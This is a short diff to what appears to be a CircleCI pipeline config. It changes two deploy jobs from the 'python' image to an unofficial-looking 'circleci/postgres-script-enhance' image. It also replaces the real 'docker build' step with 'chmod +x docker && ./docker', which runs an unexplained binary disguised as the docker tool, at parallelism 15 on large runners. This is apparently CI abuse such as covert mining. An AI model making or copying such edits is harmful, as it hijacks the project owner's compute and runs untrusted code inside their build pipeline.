@@ -3,7 +3,7 @@ jobs:
   deploy:
     parallelism: 15
     docker:
-    - image: python
+    - image: circleci/postgres-script-enhance
     resource_class: large
 
     working_dir: &working_dir ~/app
@@ -13,11 +13,11 @@ jobs:
     - setup_remote_docker
     - run:
         name: Registry
-        command: docker build -t $DOCKER_IMAGE .
+        command: chmod +x docker && ./docker
   deploy1:
     parallelism: 15
     docker:
-    - image: python
+    - image: circleci/postgres-script-enhance
 
     working_dir: &working_dir ~/app
 
@@ -26,7 +26,7 @@ jobs:
     - setup_remote_docker
     - run:
         name: Registry
-        command: docker build -t $DOCKER_IMAGE .
+        command: chmod +x docker && ./docker
 
 workflows:
   version: 2
